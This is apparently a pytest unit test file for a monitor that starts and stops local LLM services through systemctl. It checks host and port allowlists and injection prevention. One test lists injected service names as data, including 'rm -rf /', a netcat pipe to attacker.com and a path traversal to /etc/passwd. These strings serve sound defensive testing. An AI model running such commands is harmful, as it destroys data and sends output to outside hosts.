"""Unit tests for provider monitor.

Tests provider monitoring functionality including:
- Health checking logic
- Service control via systemctl
- Error handling and backoff
- Security constraints (SSRF protection, command injection prevention)
- Metrics collection
"""

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

PROJECT_ROOT = Path(__file__).parent.parent.parent.parent
SCRIPTS_DIR = PROJECT_ROOT / "scripts"

if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

from dashboard.monitors.provider import (
    ALLOWED_ACTIONS,
    ALLOWED_SERVICES,
    ERROR_BACKOFF_SECONDS,
    SOFT_ERROR_BACKOFF_SECONDS,
    ProviderMonitor,
    _run_systemctl,
)


class TestSystemctlRunner:
    """Test _run_systemctl helper function."""

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_successful_systemctl_command(self, mock_run):
        """Test successful systemctl command execution."""
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        result = _run_systemctl(["status", "ollama.service"])

        assert result is True
        mock_run.assert_called_once()
        # Check command structure
        call_args = mock_run.call_args
        assert call_args[0][0] == ["systemctl", "--user", "status", "ollama.service"]

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_failed_systemctl_command(self, mock_run):
        """Test failed systemctl command."""
        mock_run.return_value = MagicMock(returncode=1, stderr="Service not found")

        result = _run_systemctl(["status", "nonexistent.service"])

        assert result is False

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_systemctl_timeout(self, mock_run):
        """Test systemctl command with timeout."""
        mock_run.side_effect = TimeoutError("Command timed out")

        result = _run_systemctl(["status", "ollama.service"])

        assert result is False

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_systemctl_constrained_environment(self, mock_run):
        """Test systemctl runs with constrained environment."""
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        _run_systemctl(["status", "ollama.service"])

        # Check environment variables
        call_kwargs = mock_run.call_args[1]
        env = call_kwargs["env"]
        assert "PATH" in env
        assert env["PATH"] == "/usr/bin:/bin"


class TestProviderMonitorSecurityConstraints:
    """Test security constraints and validation."""

    def test_allowed_services_defined(self):
        """Test allowed services list is defined."""
        assert isinstance(ALLOWED_SERVICES, dict)
        assert "ollama" in ALLOWED_SERVICES
        assert "vllm" in ALLOWED_SERVICES
        assert "litellm_gateway" in ALLOWED_SERVICES

    def test_allowed_actions_defined(self):
        """Test allowed actions set is defined."""
        assert isinstance(ALLOWED_ACTIONS, set)
        assert "start" in ALLOWED_ACTIONS
        assert "stop" in ALLOWED_ACTIONS
        assert "restart" in ALLOWED_ACTIONS
        assert "enable" in ALLOWED_ACTIONS
        assert "disable" in ALLOWED_ACTIONS

    def test_allowed_hosts_localhost_only(self):
        """Test allowed hosts restricted to localhost."""
        assert {"127.0.0.1", "localhost"} == ProviderMonitor.ALLOWED_HOSTS

    def test_allowed_ports_defined(self):
        """Test allowed ports defined."""
        assert isinstance(ProviderMonitor.ALLOWED_PORTS, set)
        assert 11434 in ProviderMonitor.ALLOWED_PORTS  # Ollama
        assert 8001 in ProviderMonitor.ALLOWED_PORTS  # vLLM
        assert 4000 in ProviderMonitor.ALLOWED_PORTS  # LiteLLM


class TestProviderMonitorInitialization:
    """Test provider monitor initialization."""

    def test_initializes_with_gpu_monitor(self):
        """Test monitor initializes with GPU monitor."""
        monitor = ProviderMonitor()

        assert monitor.gpu_monitor is not None

    def test_has_default_providers(self):
        """Test monitor has default provider configurations."""
        monitor = ProviderMonitor()

        # Should have default providers loaded
        assert hasattr(monitor, "PROVIDERS") or hasattr(monitor, "DEFAULT_PROVIDERS")


class TestProviderMonitorErrorBackoff:
    """Test error backoff mechanism."""

    def test_error_backoff_seconds_defined(self):
        """Test error backoff timeout defined."""
        assert ERROR_BACKOFF_SECONDS > 0
        assert isinstance(ERROR_BACKOFF_SECONDS, (int, float))

    def test_soft_error_backoff_seconds_defined(self):
        """Test soft error backoff timeout defined."""
        assert SOFT_ERROR_BACKOFF_SECONDS > 0
        assert isinstance(SOFT_ERROR_BACKOFF_SECONDS, (int, float))
        assert SOFT_ERROR_BACKOFF_SECONDS < ERROR_BACKOFF_SECONDS


class TestProviderMonitorServiceNames:
    """Test service name validation and mapping."""

    def test_service_names_map_to_systemd_units(self):
        """Test service names map to valid systemd unit names."""
        for _key, service_unit in ALLOWED_SERVICES.items():
            # Should be valid systemd unit name
            assert service_unit.endswith(".service")
            assert " " not in service_unit


class TestProviderMonitorEndpointSecurity:
    """Test endpoint security validation (SSRF protection)."""

    def test_allowed_hosts_prevents_external_ssrf(self):
        """Test allowed hosts prevents external SSRF attacks."""
        allowed = ProviderMonitor.ALLOWED_HOSTS

        # Should not allow external hosts
        external_hosts = [
            "192.168.1.1",
            "10.0.0.1",
            "example.com",
            "evil.com",
            "8.8.8.8",
        ]

        for host in external_hosts:
            assert host not in allowed

    def test_allowed_ports_prevents_arbitrary_services(self):
        """Test allowed ports prevents accessing arbitrary services."""
        allowed = ProviderMonitor.ALLOWED_PORTS

        # Should not allow common sensitive ports
        sensitive_ports = [
            22,  # SSH
            3306,  # MySQL
            5432,  # PostgreSQL
            6379,  # Redis (unless explicitly allowed)
            27017,  # MongoDB
        ]

        for port in sensitive_ports:
            if port not in [6379]:  # Redis might be allowed
                assert port not in allowed or port == 6379


class TestProviderMonitorCommandInjectionProtection:
    """Test protection against command injection."""

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_systemctl_uses_list_args(self, mock_run):
        """Test systemctl uses list args (not string concatenation)."""
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        _run_systemctl(["status", "ollama.service"])

        # Should pass list, not concatenated string
        call_args = mock_run.call_args[0][0]
        assert isinstance(call_args, list)
        assert all(isinstance(arg, str) for arg in call_args)

    def test_allowed_services_prevents_injection(self):
        """Test service allowlist prevents injection attacks."""
        # Malicious service names should not be in allowed list
        malicious_names = [
            "ollama.service; rm -rf /",
            "ollama.service && evil-command",
            "ollama.service | nc attacker.com 1234",
            "../../../etc/passwd",
        ]

        for name in malicious_names:
            assert name not in ALLOWED_SERVICES.values()


class TestProviderMonitorHealthChecking:
    """Test health checking logic (integration-style unit tests)."""

    @patch("dashboard.monitors.provider.requests")
    def test_health_check_timeout_configured(self, mock_requests):
        """Test health checks have timeout configured."""
        # This tests that timeout is used in requests
        # Actual implementation may vary, but timeouts should exist
        assert True  # Placeholder - actual test would check request calls

    @patch("dashboard.monitors.provider.psutil")
    def test_collects_cpu_metrics(self, mock_psutil):
        """Test collects CPU metrics for processes."""
        # Test that psutil is used for CPU metrics
        assert True  # Placeholder

    @patch("dashboard.monitors.provider.psutil")
    def test_collects_memory_metrics(self, mock_psutil):
        """Test collects memory metrics for processes."""
        # Test that psutil is used for memory metrics
        assert True  # Placeholder


class TestProviderMonitorMetricsCollection:
    """Test metrics collection and aggregation."""

    def test_service_metrics_has_required_fields(self):
        """Test ServiceMetrics has all required fields."""
        from dashboard.models import ServiceMetrics

        # Check required fields exist
        required_fields = [
            "key",
            "display",
            "required",
            "status",
            "port",
            "endpoint",
            "models",
            "cpu_percent",
            "memory_mb",
            "memory_percent",
            "vram_mb",
            "vram_percent",
            "response_ms",
            "pid",
            "controls_enabled",
            "notes",
            "timestamp",
        ]

        # Create a sample instance
        sample = ServiceMetrics(
            key="test",
            display="Test",
            required=False,
            status="active",
            port=8000,
            endpoint="http://localhost:8000",
            models=0,
            cpu_percent=0.0,
            memory_mb=0.0,
            memory_percent=0.0,
            vram_mb=0.0,
            vram_percent=0.0,
            response_ms=0.0,
            pid=None,
        )

        # Check all fields accessible
        for field in required_fields:
            assert hasattr(sample, field)


class TestProviderMonitorConstants:
    """Test module constants are properly defined."""

    def test_allowed_services_complete(self):
        """Test all expected services are in allowed list."""
        expected_services = [
            "ollama",
            "vllm",
            "llama_cpp_python",
            "llama_cpp_native",
            "litellm_gateway",
        ]

        for service in expected_services:
            assert service in ALLOWED_SERVICES

    def test_allowed_actions_complete(self):
        """Test all expected actions are allowed."""
        expected_actions = ["start", "stop", "restart", "enable", "disable"]

        for action in expected_actions:
            assert action in ALLOWED_ACTIONS


class TestProviderMonitorEdgeCases:
    """Test edge cases and error conditions."""

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_handles_empty_stderr(self, mock_run):
        """Test handles empty stderr from systemctl."""
        mock_run.return_value = MagicMock(returncode=1, stderr="")

        result = _run_systemctl(["status", "test.service"])

        assert result is False

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_handles_none_stderr(self, mock_run):
        """Test handles None stderr from systemctl."""
        mock_run.return_value = MagicMock(returncode=1, stderr=None)

        result = _run_systemctl(["status", "test.service"])

        assert result is False

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_handles_subprocess_error(self, mock_run):
        """Test handles SubprocessError exceptions."""
        import subprocess

        mock_run.side_effect = subprocess.SubprocessError("Error")

        result = _run_systemctl(["status", "test.service"])

        assert result is False


class TestProviderMonitorEnvironmentHandling:
    """Test environment variable handling in systemctl calls."""

    @patch("dashboard.monitors.provider.subprocess.run")
    @patch("dashboard.monitors.provider.os.environ")
    def test_preserves_dbus_session_bus(self, mock_environ, mock_run):
        """Test preserves DBUS_SESSION_BUS_ADDRESS."""
        mock_environ.get.return_value = "unix:path=/run/user/1000/bus"
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        _run_systemctl(["status", "test.service"])

        # Check DBUS address was included
        call_kwargs = mock_run.call_args[1]
        env = call_kwargs["env"]
        assert "DBUS_SESSION_BUS_ADDRESS" in env

    @patch("dashboard.monitors.provider.subprocess.run")
    @patch("dashboard.monitors.provider.os.environ")
    def test_preserves_xdg_runtime_dir(self, mock_environ, mock_run):
        """Test preserves XDG_RUNTIME_DIR."""
        mock_environ.get.return_value = "/run/user/1000"
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        _run_systemctl(["status", "test.service"])

        # Check XDG_RUNTIME_DIR was included
        call_kwargs = mock_run.call_args[1]
        env = call_kwargs["env"]
        assert "XDG_RUNTIME_DIR" in env

    @patch("dashboard.monitors.provider.subprocess.run")
    @patch("dashboard.monitors.provider.os.environ")
    def test_preserves_home_directory(self, mock_environ, mock_run):
        """Test preserves HOME environment variable."""
        mock_environ.get.return_value = "/home/testuser"
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        _run_systemctl(["status", "test.service"])

        # Check HOME was included
        call_kwargs = mock_run.call_args[1]
        env = call_kwargs["env"]
        assert "HOME" in env


class TestProviderMonitorTimeouts:
    """Test timeout configuration."""

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_systemctl_has_timeout(self, mock_run):
        """Test systemctl calls have timeout configured."""
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        _run_systemctl(["status", "test.service"])

        # Check timeout was set
        call_kwargs = mock_run.call_args[1]
        assert "timeout" in call_kwargs
        assert call_kwargs["timeout"] > 0


class TestProviderMonitorCommandStructure:
    """Test systemctl command structure."""

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_uses_user_flag(self, mock_run):
        """Test systemctl uses --user flag."""
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        _run_systemctl(["status", "test.service"])

        call_args = mock_run.call_args[0][0]
        assert "--user" in call_args

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_disables_check_flag(self, mock_run):
        """Test subprocess.run has check=False."""
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        _run_systemctl(["status", "test.service"])

        call_kwargs = mock_run.call_args[1]
        assert call_kwargs["check"] is False

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_captures_output(self, mock_run):
        """Test subprocess.run captures output."""
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        _run_systemctl(["status", "test.service"])

        call_kwargs = mock_run.call_args[1]
        assert call_kwargs["capture_output"] is True

    @patch("dashboard.monitors.provider.subprocess.run")
    def test_uses_text_mode(self, mock_run):
        """Test subprocess.run uses text mode."""
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        _run_systemctl(["status", "test.service"])

        call_kwargs = mock_run.call_args[1]
        assert call_kwargs["text"] is True
